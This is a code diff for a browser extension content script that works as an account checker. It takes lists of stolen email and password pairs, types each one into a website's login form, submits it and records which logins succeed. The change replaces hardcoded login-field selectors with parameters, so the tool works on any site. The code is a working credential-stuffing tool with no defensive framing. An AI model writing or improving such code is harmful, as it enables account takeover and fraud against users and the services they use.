@@ -12,52 +12,34 @@ function parseAccounts(inputText) {
     .filter((account) => account.email && account.password);
 }
 
-function downloadValidAccounts() {
-  if (validAccounts.length === 0) {
-    alert("No valid accounts found.");
-    return;
-  }
-
-  let content = validAccounts.join("\n");
-  let blob = new Blob([content], { type: "text/plain" });
-  let url = URL.createObjectURL(blob);
-  let a = document.createElement("a");
-  a.href = url;
-  a.download = "valid_accounts.txt";
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
-}
-
-function checkNextAccount() {
+function checkNextAccount(selectors) {
   if (currentIndex >= accounts.length) {
     alert("Finished checking all accounts.");
     downloadValidAccounts();
     return;
   }
 
-  let emailInput = document.querySelector(".email-input__field--H4fRW");
-  let passwordInput = document.querySelector(".password-input__field--Qgoe0");
-  let loginButton = document.querySelector("[data-t='login-button']");
+  let emailInput = document.querySelector(selectors.emailID);
+  let passwordInput = document.querySelector(selectors.passwordID);
+  let loginButton = document.querySelector(selectors.connectID);
 
   if (!emailInput || !passwordInput || !loginButton) {
-    alert("Login fields not found on this page.");
+    alert("Login fields not found!");
     return;
   }
 
   let { email, password } = accounts[currentIndex];
 
-  // Ensure email and password fields are properly filled
   emailInput.value = email;
   emailInput.dispatchEvent(new Event("input", { bubbles: true }));
 
   passwordInput.value = password;
-  passwordInput.setAttribute("value", password); // Ensure it updates in the DOM
+  passwordInput.setAttribute("value", password);
   passwordInput.dispatchEvent(new Event("input", { bubbles: true }));
 
   setTimeout(() => {
     if (!loginButton.disabled) {
-      loginButton.click(); // Click login button
+      loginButton.click();
 
       setTimeout(() => {
         let errorMessage = document.querySelector(
@@ -77,22 +59,25 @@ function checkNextAccount() {
         }
 
         currentIndex++;
-        checkNextAccount();
-      }, 4000); // Wait for login response
+        checkNextAccount(selectors);
+      }, 4000);
     } else {
       console.log(`Invalid: ${email} (Button disabled)`);
       currentIndex++;
-      checkNextAccount();
+      checkNextAccount(selectors);
     }
-  }, 1500); // Allow time for fields to update
+  }, 1500);
 }
 
-// Listen for messages from popup.js
 chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
-  if (request.action === "startCheck" && request.accounts) {
+  if (
+    request.action === "startCheck" &&
+    request.accounts &&
+    request.selectors
+  ) {
     accounts = parseAccounts(request.accounts);
     currentIndex = 0;
     validAccounts = [];
-    checkNextAccount();
+    checkNextAccount(request.selectors);
   }
 });
